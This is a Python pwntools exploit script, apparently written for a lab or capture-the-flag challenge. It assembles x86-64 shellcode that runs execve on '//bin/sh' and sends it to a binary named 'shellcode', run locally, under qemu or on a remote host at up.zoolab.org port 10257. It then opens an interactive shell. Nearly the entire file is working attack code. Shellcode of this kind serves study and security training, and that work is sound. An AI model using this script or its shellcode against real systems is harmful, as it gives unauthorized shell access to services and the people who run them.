#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10257

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0



codes = """
  xor rax, rax
  push rax
  mov rbx, 0x68732f6e69622f2f
  push rbx
  mov rdi, rsp
  mov rsi, 0
  mov rdx, 0
  mov rax, 59
  syscall
"""

payload = asm(codes)
print(payload)

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

r.recvuntil(b'code>')
r.sendline(payload)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :